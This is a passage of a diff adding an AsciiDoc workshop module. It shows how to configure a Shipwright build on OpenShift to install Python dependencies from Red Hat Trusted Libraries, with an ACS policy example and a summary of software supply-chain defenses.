+  --from-literal=token='eyJhbGc...' \
+  -n hummingbird-builds
+----
+
+=== Step 3: Create Build Using the Strategy
+
+[source,bash,role=execute,subs="attributes"]
+----
+QUAY_ROUTE=$(oc get route -n {quay-namespace} -o jsonpath='{.items[0].spec.host}')
+
+cat << EOF | oc apply -f -
+apiVersion: shipwright.io/v1beta1
+kind: Build
+metadata:
+  name: python-app-trusted
+  namespace: hummingbird-builds
+spec:
+  source:
+    type: Git
+    git:
+      url: https://github.com/your-org/python-microservice.git
+      revision: main
+  strategy:
+    name: python-trusted-libraries
+    kind: ClusterBuildStrategy
+  paramValues:
+  - name: TRUSTED_LIBS_USERNAME
+    secretValue:
+      name: trusted-libraries-creds
+      key: username
+  - name: TRUSTED_LIBS_TOKEN
+    secretValue:
+      name: trusted-libraries-creds
+      key: token
+  output:
+    image: ${QUAY_ROUTE}/{registry-user}/python-app:trusted
+    credentials:
+      name: registry-credentials
+EOF
+----
+
+=== Step 4: Trigger Build
+
+[source,bash,role=execute]
+----
+cat << 'EOF' | oc create -f -
+apiVersion: shipwright.io/v1beta1
+kind: BuildRun
+metadata:
+  name: python-app-trusted-run-1
+  namespace: hummingbird-builds
+spec:
+  build:
+    name: python-app-trusted
+EOF
+
+# Watch build progress
+oc logs -f -n hummingbird-builds \
+  -l buildrun.shipwright.io/name=python-app-trusted-run-1
+----
+
+.*Expected output:*
+----
+Configured pip for Red Hat Trusted Libraries
+Looking in indexes: https://packages.redhat.com/trusted-libraries/python/simple
+...
+SBOM generated and basic verification complete
+BuildRun completed successfully
+----
+
+[NOTE]
+====
+**Advanced Integration**: For production pipelines, extend this BuildStrategy to:
+
+1. **Cryptographically verify** packages using the scripts from https://github.com/redhat-tssc-tmm/trusted-libraries
+2. **Upload SBOMs** to Red Hat Trusted Profile Analyzer for centralized tracking
+3. **Enforce policies** via ACS that require Trusted Libraries provenance metadata
+4. **Sign images** with RHTAS (from Module 2.6) to create end-to-end provenance chain
+====
+
+[[summary]]
+== Summary
+
+=== What You've Accomplished
+
+* ✅ **Understood Python dependency supply chain risks** -- real-world attacks on PyPI packages
+* ✅ **Configured pip for Red Hat Trusted Libraries** -- authenticated access to verified package index
+* ✅ **Built secure Python microservices** with cryptographically verified dependencies from Red Hat
+* ✅ **Deployed CPU-only ML inference** using verified numpy, pandas, and transformers packages
+* ✅ **Compared SBOMs** showing provenance differences between PyPI and Trusted Libraries
+* ✅ **(Optional) Automated verification** in Shipwright BuildStrategy for CI/CD integration
+
+=== Key Takeaways
+
+[cols="1,2",options="header"]
+|===
+| Concept | Explanation
+
+| **Zero-CVE Stack**
+| Hummingbird runtime (zero OS packages) + Trusted Libraries dependencies (verified Python packages) = complete zero-CVE application stack
+
+| **SLSA Level 3**
+| Every Trusted Libraries package has cryptographic provenance proving it was built in a hermetic Konflux pipeline from specific source code
+
+| **Sigstore Signing**
+| Packages are keylessly signed and recorded in Rekor transparency log, enabling independent verification
+
+| **Supply Chain Defense**
+| Prevents typosquatting, compromised packages, and dependency confusion attacks by providing a curated, verified package index
+
+| **ML Security**
+| Scientific computing packages (numpy, pandas, transformers) are frequently targeted -- verification is critical for AI/ML workloads
+|===
+
+=== Real-World Applications
+
+**1. Regulated Industries (Finance, Healthcare)**
+
+Organizations subject to regulatory compliance (PCI-DSS, HIPAA, SOC 2) can demonstrate:
+
+* Cryptographic proof of package provenance (audit trail)
+* Vulnerability scanning by Red Hat security teams
+* Controlled supply chain with verified sources
+
+**2. AI/ML Production Deployments**
+
+* Verify large ML dependency stacks (transformers, torch, tensorflow)
+* CPU-only inference for cost-effective deployments
+* GPU inference with same security guarantees (add GPU node pools)
+
+**3. Edge and IoT Applications**
+
+* Minimal attack surface (Hummingbird + verified deps)
+* Reduced image size (no unnecessary transitive dependencies)
+* Offline verification using cached SLSA attestations
+
+**4. DevSecOps Pipeline Enforcement**
+
+Combine with ACS policies from Module 2.7:
+
+[source,yaml]
+----
+# ACS Policy: Require Red Hat Trusted Libraries
+policy:
+  name: "Enforce Trusted Libraries for Python"
+  categories:
+    - "Supply Chain Security"
+  lifecycleStages:
+    - BUILD
+    - DEPLOY
+  policySections:
+    - policyGroups:
+      - fieldName: "SBOM Supplier"
+        values:
+          - value: "Red Hat"
+----
+
+=== Next Steps
+
+**Continue Your Journey**:
+
+1. **Integrate with Module 2.7 (ACS)** -- Create policies enforcing Trusted Libraries provenance
+2. **Explore Trusted Profile Analyzer** -- Centralized SBOM management at https://developers.redhat.com/articles/2024/03/18/red-hat-trusted-profile-analyzer-now-tech-preview
+3. **Verify Packages Cryptographically** -- Use scripts from https://github.com/redhat-tssc-tmm/trusted-libraries
+4. **Join the Early Adopter Program** -- Provide feedback at https://docs.google.com/forms/d/1wYuqh7OhQd412Aq8S1iPqYiYUt0ntF1ncTeIlX-2KRg/viewform
+5. **Read the Technical Deep Dive** -- https://developers.redhat.com/blog/2026/02/27/red-hat-trusted-libraries-trust-and-integrity-your-software-supply-chain
+
+**Additional Resources**:
+
+* Red Hat Trusted Software Supply Chain: https://www.redhat.com/en/resources/trusted-software-supply-chain-brief
+* Getting Started Guide: https://github.com/calungaproject/index/blob/main/docs/getting_started.md
+* SLSA Framework: https://slsa.dev
+* Sigstore Project: https://www.sigstore.dev
+
+---
+
+[.text-center]
+*Congratulations!* You've completed the Trusted Libraries module and built a complete zero-CVE Python application stack with cryptographic provenance.
